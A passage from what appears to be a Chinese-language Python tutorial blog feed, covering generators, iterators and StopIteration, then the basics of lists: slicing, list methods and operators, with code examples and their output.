<p>a,b &#x3D; b ,a+b  其实相当于 t &#x3D;a+b ,a &#x3D;b ,b &#x3D;t  ，所以不必写显示写出临时变量t，就可以输出斐波那契数列的前N个数字。</p>
</blockquote>
<br>

<p>上面我们发现，print(b)每次函数运行都要打印，占内存，所以为了不占内存，我们也可以使用生成器，同样是使用函数，只不过函数中有 <code>yield</code> 语句，所以叫做生成器。但是返回的不再是一个值，而是一个生成器，和上面的例子一样。</p>
<p>那么这样就不占内存了，这里说一下generator和函数的执行流程，函数是顺序执行的，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用__next__()方法的时候执行，遇到yield语句返回，再次被__next__() 调用时候从上次的返回yield语句处继续执行，也就是用多少，取多少，不占内存。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&lt;generator <span class="built_in">object</span> fib at <span class="number">0x000001C03AC34FC0</span>&gt;</span><br></pre></td></tr></table></figure>



<br>

<p>下面用3个例子说明用for…in 循环的好处，但是拿不到return 语句的返回值，那么就会报错，所以为了不让报错，就要进行异常处理，拿到返回值，如果想要拿到返回值，必须捕获StopIteration错误，而返回值包含在StopIteration的value中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 使用__next__()方法到最后一个的下一个时会报错。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;可以顺便干其他事情&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">&lt;generator <span class="built_in">object</span> fib at <span class="number">0x01058B70</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">可以顺便干其他事情</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">Traceback (most recent call last):       //看到报错，并且 StopIteration: done</span><br><span class="line">  File <span class="string">&quot;3.py&quot;</span>, line <span class="number">18</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(a.__next__())</span><br><span class="line">StopIteration: done</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 在上面fib的例子，我们在循环过程中不断调用<span class="keyword">yield</span>，就会不断中断。当然要给循环设置一个条件来退出循环，</span><br><span class="line">   不然就会产生一个无限数列出来。把函数改成generator后，我们基本上从来不会用<span class="built_in">next</span>()来获取下一个</span><br><span class="line">   返回值，而是直接使用<span class="keyword">for</span>循环来迭代，但是拿不到<span class="keyword">return</span> 语句的返回值：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fib(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">     </span><br><span class="line">结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span>             //程序没报错，但是拿不到<span class="keyword">return</span>返回的值。</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line">g = fib(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">next</span>(g)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;generator: &#x27;</span>,x)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;生成器返回值：&quot;</span>,e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">generator:  <span class="number">1</span></span><br><span class="line">generator:  <span class="number">1</span></span><br><span class="line">generator:  <span class="number">2</span></span><br><span class="line">generator:  <span class="number">3</span></span><br><span class="line">generator:  <span class="number">5</span></span><br><span class="line">generator:  <span class="number">8</span></span><br><span class="line">生成器返回值： done      //拿到了<span class="keyword">return</span>的返回值！</span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="三-迭代器"><a href="#三-迭代器" class="headerlink" title="三. 迭代器"></a><font color="#FF6347" face="Comic sans MS">三. 迭代器</font></h3><blockquote>
<p><font color="#FF7F00"><strong>迭代就是循环，迭代器功能是把一个可迭代的对象转换为生成器。因为生成器本身就是可迭代的。</strong></font><br>迭代器包含有next方法的实现，在正确的范围内返回期待的数据以及超出范围后能够抛出StopIteration的错误停止迭代。</p>
</blockquote>
<br>

<blockquote>
<p><font color="#00B2EE"><strong>可以直接作用于for循环的数据类型有以下几种：</strong></font><br><font color="#FF7F00"><strong>一类是集合数据类型：</strong></font>如list,tuple,dict,set,str等；<br><font color="#FF7F00"><strong>一类是generator：</strong></font>包括生成器和带yield的generator 函数。</p>
</blockquote>
<br>

<br>

<h4 id="3-1-可迭代对象"><a href="#3-1-可迭代对象" class="headerlink" title="3.1 可迭代对象"></a><font color="#3CB371" face="Comic sans MS">3.1 可迭代对象</font></h4><p>这些可以直接作用于for 循环的对象统称为<font color="#00B2EE"><strong>可迭代对象：Iterable</strong></font><br>可以使用 <strong><code>isinstance()</code></strong> 判断一个对象是否为可Iterable对象！</p>
<p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-isinstance.html">Python isinstance() 函数</a>]</font></p>
<br>

<p><strong>语法</strong></p>
<p><code>isinstance(object, classinfo)</code></p>
<p><strong>参数</strong><br>object – 实例对象。<br>classinfo – 可以是直接或间接类名、基本类型或者由它们组成的元组。</p>
<p><strong>返回值</strong><br>如果两个参数类型（classinfo）相同则返回 True，否则返回 False。</p>
<br>

<br>

<h4 id="3-2-迭代器"><a href="#3-2-迭代器" class="headerlink" title="3.2 迭代器"></a><font color="#3CB371" face="Comic sans MS">3.2 迭代器</font></h4><p>一个实现了iter方法的对象时可迭代的，一个实现next方法的对象是迭代器<br>可以被next()函数调用并不断返回下一个值的对象称为<font color="#00B2EE"><strong>迭代器：Iterator</strong></font>。<br>可以使用isinstance()判断一个对象是否是Iterator对象</p>
<p>所以，整体的流程为：</p>
<ol>
<li><p>使用isinstance()判断一个对象是否为Iterable对象（可迭代对象），语法为<code>isinstance(对象,Iterable)</code>。返回Ture&#x2F;False。</p>
</li>
<li><p>如果返回 Ture，使用 <code>iter(可迭代对象)</code> 即可得到返回值为生成器的东西。</p>
</li>
<li><p>然后就可以把这个返回值作为生成器去尽情的使用了。</p>
</li>
</ol>
<br>

<p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-iter.html">Python iter() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font></p>
</blockquote>
<ol>
<li>凡是可作用于for循环的对象都是Iterable类型；</li>
<li>凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；<br>集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。</li>
<li>生成器都是Iterator对象，但list、dict、str虽然是Iterable（可迭代对象），却不是Iterator（迭代器）。</li>
<li>iter()返回值是迭代器对象。</li>
</ol>
<br>

<p>举例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable,Iterator</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="string">&#x27;abc&#x27;</span>, Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>([], Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(&#123;&#125;, Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>((x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)), Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">100</span>, Iterable))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>((x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)), Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>([], Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(&#123;&#125;, Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="string">&#x27;abc&#x27;</span>, Iterator))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="built_in">iter</span>([]), Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="built_in">iter</span>(<span class="string">&#x27;abc&#x27;</span>), Iterator))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-列表、元组、字典、集合</title>
    <url>/post/Python-list-tuple-dict-set/</url>
    <content><![CDATA[<p>Python的列表相当于数组 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>


<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 列表、元组、字典、集合</font> </center>


<br>

<br>

<h3 id="一-认识列表"><a href="#一-认识列表" class="headerlink" title="一. 认识列表"></a><font color="#FF6347" face="Comic sans MS">一. 认识列表</font></h3><br>

<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>列表（list）是什么：</strong></font></p>
</blockquote>
<ol>
<li>序列是Python中最基本的数据结构。</li>
<li>在Python中，用方括号 [ ] 来表示列表，并用逗号来分隔其中的元素。并且<font color="#FF7F00"><strong>列表的数据项（各个元素）不需要具有相同的类型</strong></font>。</li>
<li>序列中的每个元素都分配一个数字 - 它的位置，即索引，<font color="#FF7F00"><strong>第一个索引是0，第二个索引是1，依此类推</strong></font>。</li>
<li>序列都可以进行的操作包括索引，切片，加，乘，检查成员。</li>
<li>此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。</li>
<li>把列表当作堆栈使用。涉及的方法有：append()、pop()</li>
<li>访问和使用列表可以使用切片。[a:b]</li>
<li>把列表当作队列使用（不过使用起来较麻烦，可自行百度）。</li>
<li>列表可以<font color="#FF7F00"><strong>嵌套使用</strong></font>。</li>
<li>列表复制是这样的：<code>list2 = list1[:]</code></li>
<li>获取列表的索引值：<code>a = list.index(&quot;String&quot;)</code></li>
</ol>
<br>

<p>定义列表的示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">list3 = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"><span class="built_in">print</span>(list3)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>] </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] </span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>] </span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="二-切片"><a href="#二-切片" class="headerlink" title="二. 切片"></a><font color="#FF6347" face="Comic sans MS">二. 切片</font></h3><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>切片和索引：</strong></font></p>
</blockquote>
<ol>
<li>与字符串的索引一样，列表索引从0开始。(在字符串那个章节总结过)列表可以进行截取、组合等；</li>
<li>你还可以处理列表的部分元素——Python称之为切片。使用下标索引来访问列表中的值，同样你也可以使用方括号[ ]的形式截取字符； [x:y]</li>
<li>要创建切片，可指定要使用的第一个元素和最后一个元素的索引。与函数range() 一样，Python在<font color="#FF7F00"><strong>到达你指定的第二个索引前面的元素后停止</strong></font>。要输出列表中的前三个元素，需要指定索引<code>0~3</code>，这将输出分别为0 、1 和2 的元素； [1:5]表示索引为1,2,3,4的四个元素</li>
<li>如果你没有指定第一个索引，Python将自动从列表开头开始； [ :6]</li>
<li>要让切片终止于列表末尾，也可使用类似的语法，即不指定第二个索引； [2: ]<br>无论列表多长，这种语法都能够让你输出从特定位置到列表末尾的所有元素。</li>
<li>如果要遍历列表的部分元素，可在for 循环中使用切片。</li>
</ol>
<br>

<p>下面示例代码（注意“&#x2F;&#x2F;”不代表注释，仅仅为了展示）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>],list1[-<span class="number">2</span>])           //类似字符串一样使用索引</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;list1[0]: &quot;</span>, list1[<span class="number">0</span>])      //输出第一个元素</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;list2[1:5]: &quot;</span>, list2[<span class="number">1</span>:<span class="number">5</span>])  //输出索引为<span class="number">1</span>到（<span class="number">5</span>-<span class="number">1</span>）的元素</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;list2[:4]: &quot;</span>, list2[<span class="number">1</span>:])    //前者输出从第<span class="number">1</span>个元素到索引为（<span class="number">4</span>-<span class="number">1</span>）的元素</span><br><span class="line">                                    //后者输出索引为<span class="number">1</span>到最后一个元素</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">chemistry <span class="number">1997</span> </span><br><span class="line">list1[<span class="number">0</span>]:  physics </span><br><span class="line">list2[<span class="number">1</span>:<span class="number">5</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] </span><br><span class="line">list2[:<span class="number">4</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>] </span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="三-更新列表"><a href="#三-更新列表" class="headerlink" title="三. 更新列表"></a><font color="#FF6347" face="Comic sans MS">三. 更新列表</font></h3><h4 id="3-1-处理元素"><a href="#3-1-处理元素" class="headerlink" title="3.1 处理元素"></a><font color="#3CB371" face="Comic sans MS">3.1 处理元素</font></h4><p>附加参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/wl404/p/7884665.html">列表使用大全</a>]</font> <font color="#00B2EE">[<a href="https://blog.csdn.net/viviliao_/article/details/79518219">Python3列表元素的修改</a>]</font> </p>
<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>1. 按索引来使用的方法</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00">append(‘String’)：</font> 将元素string追加到列表末尾，即把一个元素添加到堆栈顶；</li>
<li><font color="#FF7F00">pop(X)：</font> 删除列表中任何位置的元素，只需在括号中指定要删除的元素的索引即可。若果不指定则默认删除末尾的元素；</li>
<li><font color="#FF7F00">insert(X, “String”)：</font> 将元素String插入到索引为X的位置，原来元素从索引为X往后移；</li>
<li><font color="#FF7F00">del list[X]：</font> 删除列表list索引为X的元素；</li>
<li><font color="#FF7F00">len(list)：</font> 是个函数，统计列表list元素的个数，和在字符串中使用一样；</li>
<li>del和pop()的区别在于：del删除的元素不可以再继续使用了，但是pop()有个返回值，因为当作栈使用，它删除的元素还可以在其他地方继续使用；</li>
<li><font color="#FF7F00">reverse() ：</font> 按元素顺序倒转；</li>
<li><font color="#FF7F00">sort() ：</font> 是方法，对列表进行永久性排序，前提是列表中所有元素数据类型一样；</li>
<li><font color="#FF7F00">sorted() ：</font> 注意这是个函数，对列表进行临时排序，若列表中所有元素数据类型不一样会报错；</li>
</ol>
<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>2. 按值来使用的方法</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00">**remove(“String”)**：</font> 删除列表中值为String的元素。注意：方法remove() 只删除第一个指定的值。如果要删除的值可能在列表中出现多次，就需要使用循环来判断是否删除了所有这样的值。</li>
</ol>
<br>

<p>下面示例代码（注意“&#x2F;&#x2F;”不代表注释，仅仅为了展示）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ]</span><br><span class="line"></span><br><span class="line">list1.append(<span class="string">&#x27;Adam&#x27;</span>)      //append()</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line">a = list2.pop(<span class="number">3</span>)          //pop()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> list2[<span class="number">4</span>]              //<span class="keyword">del</span></span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"></span><br><span class="line">list2.insert(<span class="number">3</span>,<span class="number">9</span>)         //insert()</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list2))         //<span class="built_in">len</span>()</span><br><span class="line"></span><br><span class="line">list1.remove(<span class="number">1997</span>)        //remove</span><br><span class="line">list1.remove(<span class="string">&quot;Adam&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>, <span class="string">&#x27;Adam&#x27;</span>] </span><br><span class="line"><span class="number">4</span> </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>] </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">7</span>] </span><br><span class="line"><span class="number">6</span> </span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">2000</span>] </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)                        //临时排序</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(s))</span><br><span class="line"><span class="built_in">print</span>(s);<span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s.sort();<span class="built_in">print</span>(s);<span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)   //永久排序 </span><br><span class="line"></span><br><span class="line">s.reverse();<span class="built_in">print</span>(s)            //倒序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;scheme&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>] </span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="3-2-嵌套使用列表"><a href="#3-2-嵌套使用列表" class="headerlink" title="3.2 嵌套使用列表"></a><font color="#3CB371" face="Comic sans MS">3.2 嵌套使用列表</font></h4><br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>], <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">4</span> </span><br></pre></td></tr></table></figure>

<br>

<p>要注意s只有4个元素，其中s[2]又是一个list，如果拆开写就更容易理解了。<br>要拿到’php’可以写p[1]或者s[2][1]，因此s可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, p, <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(p[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>], <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">php </span><br><span class="line">php </span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="四-列表常用的方法和函数"><a href="#四-列表常用的方法和函数" class="headerlink" title="四. 列表常用的方法和函数"></a><font color="#FF6347" face="Comic sans MS">四. 列表常用的方法和函数</font></h3><h4 id="4-1-列表操作符"><a href="#4-1-列表操作符" class="headerlink" title="4.1 列表操作符"></a><font color="#3CB371" face="Comic sans MS">4.1 列表操作符</font></h4><p>列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。<br>如下所示：</p>
<table>
<thead>
<tr>
<th align="left">Python表达式</th>
<th align="left">结果</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">len([1, 2, 3])</td>
<td align="left">3</td>
<td align="left">长度</td>
</tr>
<tr>
<td align="left">[1, 2, 3] + [4, 5, 6]</td>
<td align="left">[1, 2, 3, 4, 5, 6]</td>
<td align="left">组合</td>
</tr>
<tr>
<td align="left">[‘Hi!’] * 4</td>
<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
<td align="left">重复</td>
</tr>
<tr>
<td align="left">3 in [1, 2, 3]</td>
<td align="left">True</td>
<td align="left">元素是否存在于列表中</td>
</tr>
<tr>
<td align="left">for x in [1, 2, 3]: print x,</td>
<td align="left">1 2 3</td>
<td align="left">迭代</td>
</tr>
</tbody></table>
<br>

<br>

<h4 id="4-2-列表函数-amp-方法"><a href="#4-2-列表函数-amp-方法" class="headerlink" title="4.2 列表函数&amp;方法"></a><font color="#3CB371" face="Comic sans MS">4.2 列表函数&amp;方法</font></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-lists.html">Python列表函数&amp;方法</a>]</font></p>
<p>列表中Python包含以下函数:</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(list1, list2)<br>比较两个列表的元素</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(list)<br>列表元素个数</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">max(list)<br>返回列表元素最大值</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">min(list)<br>返回列表元素最小值</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">list(seq)<br>将元组转换为列表</td>
</tr>
</tbody></table>
<br>

<p>Python包含以下方法:</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">list.append(obj)<br>在列表末尾添加新的对象</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">list.count(obj)<br>统计某个元素在列表中出现的次数</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">list.extend(seq)<br>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">list.index(obj)<br>从列表中找出某个值第一个匹配项的索引位置</td>
</tr>
<tr>
<td align="center">5</td>
